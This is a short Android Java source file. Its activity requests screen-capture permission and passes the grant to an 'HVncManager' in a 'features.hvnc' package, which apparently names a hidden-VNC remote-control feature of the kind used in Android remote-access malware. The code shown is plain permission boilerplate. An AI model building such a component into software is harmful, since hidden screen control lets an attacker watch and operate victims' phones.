package com.fason.app.ui;
import androidx.activity.ComponentActivity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import com.fason.app.features.hvnc.HVncManager;
public class ScreenCaptureProxyActivity extends ComponentActivity {
    private static final String TAG = "ScreenCaptureProxy";
    private ActivityResultLauncher<Intent> captureLauncher;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        captureLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == RESULT_OK && result.getData() != null) {
                    HVncManager.getInstance().setProjectionResult(result.getResultCode(), result.getData());
                } else {
                    HVncManager.getInstance().clearPendingStart();
                }
                finish();
            }
        );
        try {
            Intent intent = HVncManager.createScreenCaptureIntent();
            captureLauncher.launch(intent);
        } catch (Exception e) {
            Log.e(TAG, "Screen capture request failed", e);
            finish();
        }
    }
}
